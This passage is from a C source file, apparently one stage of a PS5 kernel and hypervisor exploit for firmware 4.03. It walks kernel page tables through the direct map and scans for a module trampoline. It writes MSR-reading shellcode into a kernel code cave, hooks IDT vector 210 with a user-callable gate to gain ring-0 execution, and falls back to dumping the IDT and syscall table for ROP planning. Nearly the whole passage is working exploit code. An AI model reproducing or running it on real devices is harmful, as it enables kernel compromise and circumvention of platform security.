                    }
                    VA_NEXT_2MB(va, re);
                    continue;
                }

                /* 4KB pages: bulk-read PT */
                uint64_t pt_pa = pde & PTE_PA_MASK;
                if (pt_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                uint64_t pt_entries[512];
                kernel_copyout(g_dmap_base + pt_pa, pt_entries, sizeof(pt_entries));

                uint64_t chunk_start = va & ~0x1FFFFFULL;
                for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                    uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                    if (page_va < rs || page_va >= re) continue;
                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
                    if (pa >= MAX_SAFE_PA) continue;
                    if (kernel_copyout(g_dmap_base + pa, full_page, 4096) != 0) continue;
                    fp_pages++;
                    int max_off = 4096 - (int)sizeof(tramp_prefix);
                    if (max_off > 4096 - suffix_off - (int)sizeof(tramp_suffix))
                        max_off = 4096 - suffix_off - (int)sizeof(tramp_suffix);
                    for (int off = 0; off <= max_off; off++) {
                        if (memcmp(full_page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                            memcmp(full_page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                            trampoline_kva = page_va + off;
                            int avail = 4096 - off;
                            if (avail > 64) avail = 64;
                            memcpy(hdr, full_page + off, avail);
                            printf("[+] FOUND trampoline at VA 0x%lx (page offset 0x%x)!\n",
                                   (unsigned long)trampoline_kva, off);
                            printf("    bytes: ");
                            for (int b = 0; b < (avail < 58 ? avail : 58); b++)
                                printf("%02x ", hdr[b]);
                            printf("\n");
                            break;
                        }
                    }
                }
                VA_NEXT_2MB(va, re);
            }

            printf("    Full-page scan: %lu pages checked\n", (unsigned long)fp_pages);
            fflush(stdout);
        }

        /* Fallback: sentinel scan (also hierarchical + DMAP) */
        if (trampoline_kva == 0) {
            printf("[*] Trampoline not at page start — trying sentinel scan...\n");
            printf("[*] Searching for sentinel 0x%lx\n", (unsigned long)result_kva);
            fflush(stdout);

            uint8_t page[4096];
            uint64_t sentinel_va = 0;
            uint64_t sent_chunks = 0;

            for (int ri = 0; ri < nranges && sentinel_va == 0; ri++) {
                uint64_t rs = ranges[ri].start, re = ranges[ri].end;
                uint64_t va = rs & ~0x1FFFFFULL;

                for (; va < re && sentinel_va == 0; ) {
                    uint64_t pml4e;
                    kernel_copyout(g_dmap_base + g_cr3_phys +
                                   ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                    if (!(pml4e & PTE_PRESENT)) {
                        uint64_t n = (va + (1ULL<<39)) & ~((1ULL<<39)-1);
                        if (n <= va) break; va = n; continue;
                    }
                    uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
                    if (pdpt_pa >= MAX_SAFE_PA) {
                        uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
                        if (n <= va) break; va = n; continue;
                    }
                    uint64_t pdpte;
                    kernel_copyout(g_dmap_base + pdpt_pa +
                                   ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                    if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
                        uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
                        if (n <= va) break; va = n; continue;
                    }
                    uint64_t pd_pa = pdpte & PTE_PA_MASK;
                    if (pd_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                    uint64_t pde;
                    kernel_copyout(g_dmap_base + pd_pa +
                                   ((va >> 21) & 0x1FF) * 8, &pde, 8);
                    sent_chunks++;
                    if (sent_chunks % 100 == 0) {
                        printf("    ...sentinel: %lu chunks (VA=0x%lx)\r",
                               (unsigned long)sent_chunks, (unsigned long)va);
                        fflush(stdout);
                    }
                    if (!(pde & PTE_PRESENT)) { VA_NEXT_2MB(va, re); continue; }

                    if (pde & PTE_PS) {
                        uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                        if (base_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                        uint64_t cs = va & ~0x1FFFFFULL;
                        for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
                            uint64_t pva = cs + (uint64_t)pi * 0x1000;
                            if (pva < rs || pva >= re) continue;
                            uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                            if (pa >= MAX_SAFE_PA) continue;
                            if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
                            for (int off = 0; off <= 4096 - 8; off += 8) {
                                uint64_t v; memcpy(&v, page + off, 8);
                                if (v == result_kva) {
                                    sentinel_va = pva + off;
                                    printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
                                }
                            }
                        }
                        VA_NEXT_2MB(va, re); continue;
                    }

                    uint64_t pt_pa = pde & PTE_PA_MASK;
                    if (pt_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                    uint64_t pt[512];
                    kernel_copyout(g_dmap_base + pt_pa, pt, sizeof(pt));
                    uint64_t cs = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
                        uint64_t pva = cs + (uint64_t)pi * 0x1000;
                        if (pva < rs || pva >= re) continue;
                        if (!(pt[pi] & PTE_PRESENT)) continue;
                        uint64_t pa = pt[pi] & PTE_PA_MASK;
                        if (pa >= MAX_SAFE_PA) continue;
                        if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
                        for (int off = 0; off <= 4096 - 8; off += 8) {
                            uint64_t v; memcpy(&v, page + off, 8);
                            if (v == result_kva) {
                                sentinel_va = pva + off;
                                printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
                            }
                        }
                    }
                    VA_NEXT_2MB(va, re);
                }
            }

            if (sentinel_va) {
                /* Search backward from sentinel for trampoline */
                uint64_t slo = (sentinel_va & ~0xFFFULL) - 0x10000;
                for (uint64_t a = slo; a < sentinel_va; a += 0x1000) {
                    uint64_t pa = va_to_pa_quiet(a);
                    if (pa == 0) continue;
                    if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
                                       hdr, sizeof(hdr)) != 0) continue;
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = a;
                        printf("[+] FOUND trampoline at 0x%lx (near sentinel)!\n",
                               (unsigned long)a);
                        break;
                    }
                }
            }
        }

        printf("[*] Scan done: %lu 2MB chunks (%lu mapped), %lu pages mapped\n",
               (unsigned long)total_2mb_checked, (unsigned long)total_2mb_mapped,
               (unsigned long)total_pages_mapped);

        /* Compute trampoline_xapic_mode and g_trampoline_target KVAs
         * from the loaded machine code (works for both primary and
         * sentinel scan paths — hdr[] has the trampoline page bytes).
         *
         * This bypasses R_X86_64_32S relocations in hv_init (which
         * the PS5 kernel linker doesn't resolve for these symbols).
         * Instead we use:
         *   - Known .text layout: trampoline_xapic_mode is at +0x23
         *     (right after hv_idt_trampoline's 35-byte naked asm)
         *   - The R_X86_64_PC32 relocation in the mov instruction,
         *     which the kernel linker DOES resolve, to find
         *     g_trampoline_target's actual KVA.
         *
         * Layout (from objdump -d hv_kmod.ko):
         *   0x00: hv_idt_trampoline  (35 bytes, padded to 0x30)
         *   0x23: trampoline_xapic_mode:
         *         55              push rbp
         *         48 8b 05 XX..   mov disp32(%rip), %rax  ← g_trampoline_target
         *   The 4-byte displacement at hdr[0x8c..0x8f] is RIP-relative
         *   from offset 0x90 (end of the 7-byte mov instruction). */
        #define KMOD_XAPIC_OFFSET  0x23
        #define KMOD_DISP_OFFSET   0x27
        #define KMOD_DISP_RIP      0x2B  /* RIP after mov instruction */

        if (trampoline_kva && !g_kmod_trampoline_func) {
            if (hdr[KMOD_XAPIC_OFFSET]   == 0x55 &&  /* push rbp */
                hdr[KMOD_XAPIC_OFFSET+1]  == 0x48 &&  /* REX.W */
                hdr[KMOD_XAPIC_OFFSET+2]  == 0x8b &&  /* MOV r64, r/m64 */
                hdr[KMOD_XAPIC_OFFSET+3]  == 0x05) {  /* ModR/M: [RIP+disp32] → RAX */

                int32_t disp;
                memcpy(&disp, &hdr[KMOD_DISP_OFFSET], 4);

                g_kmod_trampoline_func   = trampoline_kva + KMOD_XAPIC_OFFSET;
                g_kmod_trampoline_target = trampoline_kva + KMOD_DISP_RIP + (int64_t)disp;
                g_kmod_kid = kid;

                printf("[+] Phase 7: Computed trampoline addresses from machine code:\n");
                printf("    trampoline_xapic_mode() = 0x%016lx (page + 0x%x)\n",
                       (unsigned long)g_kmod_trampoline_func, KMOD_XAPIC_OFFSET);
                printf("    g_trampoline_target     = 0x%016lx (RIP+disp32, disp=%d)\n",
                       (unsigned long)g_kmod_trampoline_target, (int)disp);

            } else {
                printf("[!] trampoline_xapic_mode signature mismatch at +0x%x:\n",
                       KMOD_XAPIC_OFFSET);
                printf("    Expected: 55 48 8b 05\n");
                printf("    Got:      %02x %02x %02x %02x\n",
                       hdr[KMOD_XAPIC_OFFSET], hdr[KMOD_XAPIC_OFFSET+1],
                       hdr[KMOD_XAPIC_OFFSET+2], hdr[KMOD_XAPIC_OFFSET+3]);
            }
        }

        /* If SYSINIT already invoked hv_init, skip IDT hook and shellcode
         * injection — we only needed the scanner for address computation.
         * hv_init has a re-entry guard so IDT invoke would be harmless,
         * but the scanner alone suffices for Phase 7/9 setup. */
        if (!need_idt_invoke) {
            if (g_kmod_gp_handler) {
                printf("[+] Scanner found KLD gp_handler — skipping IDT invocation.\n");
            } else if (trampoline_kva) {
                printf("[!] Trampoline found but signature mismatch — gp_handler unavailable.\n");
            } else {
                printf("[-] Scanner did not find trampoline despite SYSINIT success.\n");
                printf("    gp_handler KVA unavailable — Phase 9 cannot arm.\n");
            }
            goto idt_done;
        }

        /* ── Step 4c: Direct shellcode injection (if trampoline not found) ──
         *
         * If kldload failed or the trampoline scanner didn't find the
         * module in memory, fall back to direct shellcode injection.
         *
         * Fallback: write self-contained MSR-reading shellcode into a ktext
         * code cave, hook an IDT entry, trigger INT from ring 3, then
         * restore everything. On FW 4.03 without GMET, ktext pages are
         * writable via DMAP and executable.
         */
        uint64_t injected_cave_pa = 0;  /* non-zero if we injected shellcode */
        int injected_sc_len = 0;
        uint8_t cave_backup[1024];

        if (trampoline_kva == 0) {
            printf("[-] Trampoline not found in any scan range.\n");
            printf("\n[*] Step 4c: Direct shellcode injection into ktext code cave...\n");

            /* Build MSR-reading shellcode */
            uint8_t shellcode[1024];
            int sc_len = build_msr_shellcode(shellcode, sizeof(shellcode), result_kva);
            printf("[+] Shellcode built: %d bytes\n", sc_len);

            /* Scan ktext for a code cave (consecutive 0xCC / INT3 bytes) */
            printf("[*] Scanning ktext for code cave (need %d bytes of 0xCC)...\n", sc_len);
            uint64_t cave_kva = 0;
            uint64_t cave_pa = 0;
            uint8_t kpage[4096];

            /* Scan first 4MB of ktext for a suitable cave */
            uint64_t kt_scan_start = g_ktext_base;
            uint64_t kt_scan_end = g_ktext_base + 0x400000;
            int best_run = 0;
            uint64_t best_run_kva = 0, best_run_pa = 0;

            for (uint64_t kva = kt_scan_start; kva < kt_scan_end; kva += 0x1000) {
                uint64_t pa = va_to_pa_quiet(kva);
                if (pa == 0) continue;
                if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;

                /* Count consecutive 0xCC bytes in this page */
                int run = 0;
                for (int off = 0; off < 4096; off++) {
                    if (kpage[off] == 0xCC) {
                        run++;
                        if (run >= sc_len && run > best_run) {
                            best_run = run;
                            /* Cave starts at (off - run + 1) */
                            best_run_kva = kva + (off - run + 1);
                            best_run_pa = pa + (off - run + 1);
                        }
                    } else {
                        run = 0;
                    }
                }
            }

            if (best_run >= sc_len) {
                cave_kva = best_run_kva;
                cave_pa = best_run_pa;
                printf("[+] Code cave found: KVA=0x%lx PA=0x%lx (%d bytes of 0xCC)\n",
                       (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
            } else {
                printf("[-] No suitable code cave found (best run: %d, need %d).\n",
                       best_run, sc_len);
                printf("    Trying kdata region for code cave...\n");

                /* Fallback: scan first 4MB of kdata for 0xCC or 0x00 runs.
                 * Skip first page — reserved for Phase 7 persistence markers. */
                for (uint64_t kva = g_kdata_base + 0x1000; kva < g_kdata_base + 0x400000; kva += 0x1000) {
                    uint64_t pa = va_to_pa_quiet(kva);
                    if (pa == 0) continue;
                    if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;
                    int run = 0;
                    for (int off = 0; off < 4096; off++) {
                        if (kpage[off] == 0xCC || kpage[off] == 0x00) {
                            run++;
                            if (run >= sc_len && run > best_run) {
                                best_run = run;
                                best_run_kva = kva + (off - run + 1);
                                best_run_pa = pa + (off - run + 1);
                            }
                        } else {
                            run = 0;
                        }
                    }
                }
                if (best_run >= sc_len) {
                    cave_kva = best_run_kva;
                    cave_pa = best_run_pa;
                    printf("[+] Code cave in kdata: KVA=0x%lx PA=0x%lx (%d bytes)\n",
                           (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
                } else {
                    printf("[-] No code cave found anywhere (best: %d bytes).\n", best_run);
                    goto idt_skip;
                }
            }

            /* Check if the cave is in ktext (executable) or kdata (NX).
             * Sony's HV enforces strict W^X via NPT:
             *   ktext pages: execute-only (XOM) — can't read/write
             *   kdata pages: read-write — can't execute
             * If the cave is in kdata, we can write shellcode there but
             * executing it will trigger #NPF → crash.  Skip execution. */
            int cave_in_ktext = (cave_kva >= g_ktext_base &&
                                 cave_kva < g_ktext_base + 0xC00000);
            if (!cave_in_ktext) {
                printf("[!] Code cave is in kdata (0x%lx), NOT ktext.\n",
                       (unsigned long)cave_kva);
                printf("    NPT enforces NX on kdata pages — execution would crash.\n");
                printf("    ktext is XOM (read/write blocked) — can't inject there either.\n");
                printf("    W^X enforcement prevents direct shellcode injection.\n");
                printf("\n[*] Step 4d: Falling back to ring-3 diagnostics...\n");
                goto ring3_fallback;
            }

            /* Save original bytes from code cave */
            kernel_copyout(g_dmap_base + cave_pa, cave_backup, sc_len);
            printf("[*] Saved %d bytes from code cave.\n", sc_len);
            injected_cave_pa = cave_pa;
            injected_sc_len = sc_len;

            /* Write shellcode to code cave via DMAP */
            printf("[*] Writing shellcode to DMAP+0x%lx...\n",
                   (unsigned long)cave_pa);
            kernel_copyin(shellcode, g_dmap_base + cave_pa, sc_len);

            /* Verify write */
            uint8_t verify[16];
            kernel_copyout(g_dmap_base + cave_pa, verify, 16);
            printf("    Verify: ");
            for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
            printf("\n");
            if (memcmp(verify, shellcode, 16) != 0) {
                printf("[-] Write verification FAILED — DMAP write to ktext blocked?\n");
                goto idt_skip;
            }
            printf("[+] Shellcode written and verified.\n");

            trampoline_kva = cave_kva;
        }

        /* ── IDT hook: common path for both kldload trampoline and injected shellcode ── */

        /* Read IDTR (SIDT is unprivileged on AMD64) */
        struct {
            uint16_t limit;
            uint64_t base;
        } __attribute__((packed)) idtr;
        __asm__ volatile("sidt %0" : "=m"(idtr));
        printf("[*] IDTR: base=0x%lx, limit=0x%x (%u entries)\n",
               (unsigned long)idtr.base, idtr.limit, (idtr.limit + 1) / 16);

        #define HV_IDT_VECTOR 210  /* 0xD2 — well above PIC/APIC range */

        if (((unsigned)(HV_IDT_VECTOR) + 1) * 16 > (unsigned)(idtr.limit + 1)) {
            printf("[-] IDT too small for vector %u.\n", HV_IDT_VECTOR);
            goto idt_skip;
        }

        struct idt_gate {
            uint16_t offset_lo;
            uint16_t selector;
            uint8_t  ist;
            uint8_t  type_attr;
            uint16_t offset_mid;
            uint32_t offset_hi;
            uint32_t reserved;
        } __attribute__((packed));

        uint64_t gate_addr = idtr.base + HV_IDT_VECTOR * sizeof(struct idt_gate);

        /* Save original gate */
        struct idt_gate orig_gate;
        kernel_copyout(gate_addr, &orig_gate, sizeof(orig_gate));

        /* Get kernel CS from #PF handler (vector 14) */
        struct idt_gate ref_gate;
        kernel_copyout(idtr.base + 14 * sizeof(struct idt_gate), &ref_gate, sizeof(ref_gate));
        uint16_t kernel_cs = ref_gate.selector;
        printf("[*] Kernel CS: 0x%04x (from IDT[14])\n", kernel_cs);

        /* Install IDT gate */
        struct idt_gate new_gate;
        memset(&new_gate, 0, sizeof(new_gate));
        new_gate.offset_lo  = (uint16_t)(trampoline_kva & 0xFFFF);
        new_gate.offset_mid = (uint16_t)((trampoline_kva >> 16) & 0xFFFF);
        new_gate.offset_hi  = (uint32_t)(trampoline_kva >> 32);
        new_gate.selector   = kernel_cs;
        new_gate.ist        = 0;
        new_gate.type_attr  = 0xEE;  /* P=1, DPL=3, type=0xE (interrupt gate) */

        printf("[*] Installing IDT[%u] → 0x%lx ...\n",
               HV_IDT_VECTOR, (unsigned long)trampoline_kva);
        kernel_copyin(&new_gate, gate_addr, sizeof(new_gate));

        /* Clear buffer before invocation */
        memset((void *)result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);

        /* Fire! */
        printf("[*] Triggering INT %u → shellcode → MSR reads...\n", HV_IDT_VECTOR);
        __asm__ volatile("int $210" ::: "memory");
        printf("[+] Returned from ring-0 interrupt handler!\n");

        /* Restore original IDT entry */
        kernel_copyin(&orig_gate, gate_addr, sizeof(orig_gate));
        printf("[*] IDT[%u] restored.\n", HV_IDT_VECTOR);

        /* Restore code cave if we injected shellcode */
        if (injected_cave_pa != 0) {
            kernel_copyin(cave_backup, g_dmap_base + injected_cave_pa, injected_sc_len);
            printf("[*] Code cave bytes restored (%d bytes).\n", injected_sc_len);
        }

        /* Re-check results */
        memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
        if (first_qword != 0)
            printf("[+] Buffer is no longer zero — code execution worked!\n");
        else
            printf("[-] Buffer still zero after INT invocation.\n");

        /* Fallback: extract trampoline addresses from result buffer
         * (only if scanner-based computation didn't already set them). */
        if (!g_kmod_trampoline_func &&
            results->trampoline_func_kva != 0 && results->trampoline_target_kva != 0) {
            g_kmod_trampoline_func = results->trampoline_func_kva;
            g_kmod_trampoline_target = results->trampoline_target_kva;
            g_kmod_kid = kid;
            printf("[+] Phase 7 trampoline addresses (from result buffer):\n");
            printf("    trampoline_xapic_mode() = 0x%016lx\n",
                   (unsigned long)g_kmod_trampoline_func);
            printf("    g_trampoline_target     = 0x%016lx\n",
                   (unsigned long)g_kmod_trampoline_target);
        }
        if (!g_kmod_gp_handler && results->gp_handler_kva != 0) {
            g_kmod_gp_handler = results->gp_handler_kva;
            printf("    gp_handler()            = 0x%016lx\n",
                   (unsigned long)g_kmod_gp_handler);
        }

        goto idt_done;

ring3_fallback:
        /* ── Step 4d: Ring-3 diagnostics (W^X prevents code injection) ──
         *
         * HV NPT enforces strict W^X:
         *   ktext: X-only (can execute, can't read/write)
         *   kdata/DMAP: RW (can read/write, can't execute)
         *
         * Without writable+executable pages, we can't inject shellcode.
         * Collect what we can from ring 3 and dump sysent for future ROP. */

        /* 4d-1: sysarch-based FS/GS BASE reads
         * sysarch(2) = syscall 165, subcommands:
         *   128 = AMD64_GET_FSBASE
         *   130 = AMD64_GET_GSBASE */
        {
            #define SYS_sysarch     165
            #define AMD64_GET_FSBASE 128
            #define AMD64_GET_GSBASE 130
            uint64_t fs_base = 0, gs_base = 0;
            int sa_ret;
            sa_ret = syscall(SYS_sysarch, AMD64_GET_FSBASE, &fs_base);
            printf("[*] sysarch(GET_FSBASE): ret=%d, value=0x%lx\n",
                   sa_ret, (unsigned long)fs_base);
            sa_ret = syscall(SYS_sysarch, AMD64_GET_GSBASE, &gs_base);
            printf("[*] sysarch(GET_GSBASE): ret=%d, value=0x%lx\n",
                   sa_ret, (unsigned long)gs_base);
        }

        /* 4d-2: Known values from exploit setup */
        printf("[*] Known from exploit:\n");
        printf("    ktext_base  = 0x%lx\n", (unsigned long)g_ktext_base);
        printf("    kdata_base  = 0x%lx\n", (unsigned long)g_kdata_base);
        printf("    dmap_base   = 0x%lx\n", (unsigned long)g_dmap_base);
        printf("    CR3 (phys)  = 0x%lx\n", (unsigned long)g_cr3_phys);
        fflush(stdout);

        /* 4d-3: IDT handler addresses
         * On FW 4.03, SIDT works from ring 3 (not HV-intercepted).
         * However, we scan kdata via DMAP as a fallback that also
         * works on FW versions where SIDT may be intercepted.
         * (Direct kernel_copyout from KVA fails on many kdata pages;
         *  DMAP reads after page table walk always succeed.)
         *
         * IDT = 256 × 16-byte gate descriptors:
         *   +0: uint16 offset_lo   +2: uint16 selector (kernel CS)
         *   +4: uint8 ist          +5: uint8 type_attr (0x8E=int, 0x8F=trap)
         *   +6: uint16 offset_mid  +8: uint32 offset_hi  +12: uint32 reserved(0) */
        {
            printf("[*] Searching kdata for IDT via DMAP (SIDT is HV-intercepted)...\n");
            fflush(stdout);

            uint64_t idt_kva = 0;
            uint16_t idt_sel = 0;
            uint8_t idt_pg[4096];
            int pages_ok = 0, pages_fail = 0;

            /* Scan first 128MB of kdata via DMAP.
             * Relaxed criteria: accept any kernel VA handler (>= 0xffffffff80000000),
             * selector up to 0x80, to account for PS5's custom GDT. */
            int best_run = 0;
            uint64_t best_run_off = 0;
            for (uint64_t off = 0; off < 0x8000000 && !idt_kva; off += 4096) {
                /* Progress every 16MB (4096 pages) */
                if ((off & 0xFFFFFF) == 0 && off > 0) {
                    printf("    IDT scan: %luMB/%dMB (%d pages OK, %d fail)\n",
                           (unsigned long)(off >> 20), 128, pages_ok, pages_fail);
                    fflush(stdout);
                }
                uint64_t kva = g_kdata_base + off;
                uint64_t pa = va_to_pa_quiet(kva);
                if (!pa || pa >= MAX_SAFE_PA) { pages_fail++; continue; }
                if (kernel_copyout(g_dmap_base + pa, idt_pg, 4096) != 0) {
                    pages_fail++; continue;
                }
                pages_ok++;

                for (int boff = 0; boff <= 4096 - 16*8 && !idt_kva; boff += 16) {
                    int good = 0;
                    int entry0_valid = 0;
                    uint16_t first_sel = 0;
                    for (int e = 0; e < 8; e++) {
                        uint8_t *g = &idt_pg[boff + e * 16];
                        uint16_t lo, sel, mid;
                        uint32_t hi, rsv;
                        uint8_t type_attr;
                        memcpy(&lo,  g + 0, 2);
                        memcpy(&sel, g + 2, 2);
                        type_attr = g[5];
                        memcpy(&mid, g + 6, 2);
                        memcpy(&hi,  g + 8, 4);
                        memcpy(&rsv, g + 12, 4);
                        uint64_t h = (uint64_t)lo | ((uint64_t)mid << 16) |
                                     ((uint64_t)hi << 32);
                        /* Relaxed: any kernel VA, selector up to 0x80 */
                        if (h >= 0xffffffff80000000ULL &&
                            (type_attr == 0x8E || type_attr == 0x8F) &&
                            sel != 0 && sel <= 0x80 && (sel & 7) == 0 &&
                            rsv == 0) {
                            good++;
                            if (e == 0) entry0_valid = 1;
                            if (first_sel == 0) first_sel = sel;
                        }
                    }
                    if (good > best_run) {
                        best_run = good;
                        best_run_off = off + boff;
                    }
                    /* Require entry 0 (#DE) to be a valid gate.
                     * Without this, the scanner can match 16 bytes
                     * before the real IDT (entries 1-7 are real
                     * entries 0-6, giving 7/8 valid but wrong base). */
                    if (good >= 6 && entry0_valid) {
                        idt_kva = kva + boff;
                        idt_sel = first_sel;
                    }
                }
            }

            printf("    (scanned %d pages, %d unmapped, best gate run=%d at kdata+0x%lx)\n",
                   pages_ok, pages_fail, best_run, (unsigned long)best_run_off);

            if (idt_kva) {
                printf("[+] IDT found at kdata+0x%lx (KVA 0x%lx), kernel CS=0x%x\n",
                       (unsigned long)(idt_kva - g_kdata_base),
                       (unsigned long)idt_kva, idt_sel);

                static const struct { int vec; const char *name; } idt_vecs[] = {
                    {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
                    {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
                    {32, "Timer"}, {128, "int80"},
                };
                for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
                    int v = idt_vecs[i].vec;
                    uint64_t gate_kva = idt_kva + v * 16;
                    uint64_t gate_pa = va_to_pa_quiet(gate_kva);
                    uint8_t g[16];
                    if (!gate_pa || kernel_copyout(g_dmap_base + gate_pa, g, 16) != 0) {
                        printf("    IDT[%3d] %-6s — read failed\n", v, idt_vecs[i].name);
                        continue;
                    }
                    uint16_t lo, sel, mid;
                    uint32_t hi;
                    memcpy(&lo,  g + 0, 2);
                    memcpy(&sel, g + 2, 2);
                    memcpy(&mid, g + 6, 2);
                    memcpy(&hi,  g + 8, 4);
                    uint64_t handler = (uint64_t)lo | ((uint64_t)mid << 16) |
                                       ((uint64_t)hi << 32);
                    printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx) sel=0x%x\n",
                           v, idt_vecs[i].name, (unsigned long)handler,
                           (unsigned long)(handler - g_ktext_base), sel);
                }
            } else {
                printf("[-] IDT not found in kdata (first 128MB).\n");
            }
            fflush(stdout);
        }

        /* Variables hoisted for use by sysent dump, verification, and
         * ring-0 execution */
        int sysent_found = 0;
        int sysent_verified = 0;
        uint64_t sysent_kva = 0;

        /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
        {
            /* struct sysent (0x30 = 48 bytes, confirmed via etaHEN kexec.h):
             *   0x00: uint32_t n_arg
             *   0x04: uint32_t pad
             *   0x08: uint64_t sy_call       (function pointer in ktext)
             *   0x10: uint64_t sy_auevent
             *   0x18: uint64_t sy_systrace_args
             *   0x20: uint32_t sy_entry
             *   0x24: uint32_t sy_return
             *   0x28: uint32_t sy_flags
             *   0x2C: uint32_t sy_thrcnt
             *
             * sysentvec for FW 4.03 is at kdata+0xd11bb8 (from etaHEN offsets).
             *
             * IMPORTANT: etaHEN daemon's pause_resume_kstuff() writes
             * 0xdeb7 or 0xffff at sysentvec+14, which corrupts the
             * top 16 bits of sv_table (at struct offset 8, bytes 14-15).
             * We must reconstruct the canonical pointer by forcing
             * bits 48-63 back to 0xFFFF. */
            printf("[*] Looking up sysent via known sysentvec offset...\n");
            fflush(stdout);

            #define SYSENT_STRIDE 0x30  /* 48 bytes per entry */

            /* Read sysentvec at known offset via DMAP */
            uint64_t sysentvec_kva = g_kdata_base + 0xd11bb8;
            uint64_t sysentvec_pa = va_to_pa_quiet(sysentvec_kva);

            if (sysentvec_pa) {
                uint8_t svec[24];
                kernel_copyout(g_dmap_base + sysentvec_pa, svec, 24);

                /* Dump raw bytes for diagnostics */
                printf("    sysentvec raw (24 bytes at PA 0x%lx):\n      ",
                       (unsigned long)sysentvec_pa);
                for (int i = 0; i < 24; i++)
                    printf("%02x ", svec[i]);
                printf("\n");

                int32_t sv_size;
                uint64_t sv_table_raw;
                memcpy(&sv_size, svec, 4);
                memcpy(&sv_table_raw, svec + 8, 8);

                /* etaHEN daemon corrupts bytes 14-15 (top 16 bits of sv_table)
                 * with 0xdeb7 (unpaused) or 0xffff (paused).
                 * Reconstruct canonical kernel pointer. */
                uint64_t sv_table = (sv_table_raw & 0x0000FFFFFFFFFFFFULL)
                                  | 0xFFFF000000000000ULL;

                printf("    sv_size=%d, sv_table_raw=0x%lx → fixed=0x%lx\n",
                       sv_size, (unsigned long)sv_table_raw,
                       (unsigned long)sv_table);

                /* Also check offset-14 toggle value */
                uint16_t toggle;
                memcpy(&toggle, svec + 14, 2);
                printf("    offset+14 toggle=0x%04x (%s)\n", toggle,
                       toggle == 0xdeb7 ? "unpaused/etaHEN active" :
                       toggle == 0xffff ? "paused/normal" : "unknown");

                if (sv_size >= 300 && sv_size <= 1024 &&
                    sv_table >= g_kdata_base &&
                    sv_table < g_kdata_base + 0x4000000) {
                    sysent_kva = sv_table;
                    sysent_found = 1;
                    printf("[+] Sysent table at KVA 0x%lx (kdata+0x%lx), %d entries\n",
                           (unsigned long)sysent_kva,
                           (unsigned long)(sysent_kva - g_kdata_base), sv_size);
                } else {
                    printf("    Reconstructed sv_table out of range — trying scan.\n");
                }
            } else {
                printf("    sysentvec VA 0x%lx not mapped — trying scan.\n",
                       (unsigned long)sysentvec_kva);
            }

            /* Fallback: scan kdata via DMAP for narg pattern */
            if (!sysent_found) {
                printf("[*] Scanning kdata for sysent table via DMAP...\n");
                fflush(stdout);

                /* FreeBSD syscall nargs for entries 0-6:
                 *   0=nosys(0), 1=exit(1), 2=fork(0),
                 *   3=read(3), 4=write(3), 5=open(3), 6=close(1) */
                static const int expected_nargs[] = {0, 1, 0, 3, 3, 3, 1};
                int match_size = SYSENT_STRIDE * 7;
                uint8_t blk[4096];
                int pages_ok = 0, pages_fail = 0;

                for (uint64_t pg = 0; pg < 0x4000000 && !sysent_found; pg += 4096) {
                    uint64_t kva = g_kdata_base + pg;
                    uint64_t pa = va_to_pa_quiet(kva);
                    if (!pa) { pages_fail++; continue; }
                    if (kernel_copyout(g_dmap_base + pa, blk, 4096) != 0) {
                        pages_fail++; continue;
                    }
                    pages_ok++;

                    for (int boff = 0; boff <= 4096 - match_size && !sysent_found; boff += 8) {
                        int match = 1;
                        for (int i = 0; i < 7 && match; i++) {
                            int32_t narg;
                            memcpy(&narg, &blk[boff + i * SYSENT_STRIDE], 4);
                            if (narg != expected_nargs[i]) match = 0;
                        }
                        if (match) {
                            uint64_t call0;
                            memcpy(&call0, &blk[boff + 8], 8);
                            if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
                                sysent_kva = kva + boff;
                                sysent_found = 1;
                            }
                        }
                    }
                }
                if (!sysent_found)
                    printf("[-] Sysent not found (scanned %d pages, %d unmapped).\n",
                           pages_ok, pages_fail);
            }

            if (sysent_found) {
                /* Dump key syscalls via DMAP reads */
                printf("[*] Key sysent entries (sy_narg, sy_call -> ktext offset):\n");
                static const struct { int num; const char *name; } key_syscalls[] = {
                    {0, "nosys"}, {1, "exit"}, {2, "fork"}, {3, "read"},
